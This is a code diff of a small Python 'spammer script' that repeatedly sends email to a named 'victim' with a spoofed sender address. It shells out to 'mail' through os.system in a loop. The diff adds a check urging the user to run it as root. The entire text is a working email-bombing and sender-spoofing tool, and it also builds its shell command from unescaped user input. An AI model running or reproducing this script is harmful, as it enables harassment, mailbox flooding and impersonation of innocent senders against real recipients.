@@ -8,7 +8,7 @@
 # spammer script by mftb
 # shell script sux, python ftw
 
-import os, sys
+import os, sys, getpass
 
 # bash magic
 # echo "message_body" | mail -s "subject" -a "From: Someone <someone@example.com>" victim@example.com
@@ -18,6 +18,8 @@ def usage():
     print "usage: ./spammer <number_of_messages> <victim> <spoof> \"<subject>\" \"<message_body>\""
 
 # gets the command line args
+if getpass.getuser() != "root":
+    print "this script works better when runned by a root user"
 cmdline=sys.argv[1:]
 if len(cmdline) != 5:
     usage()
@@ -34,7 +36,6 @@ subject = cmdline[3]
 message_body = cmdline[4]
 result = 0
 
-# the magic starts here
 for i in range(0, limit):
     cmd = "echo \"" + message_body + " " + str(i) + "\" | mail -s \"" + subject + " " + str(i) + "\" -a \"From:" + spoof + "\" " + victim
     result = os.system(cmd)
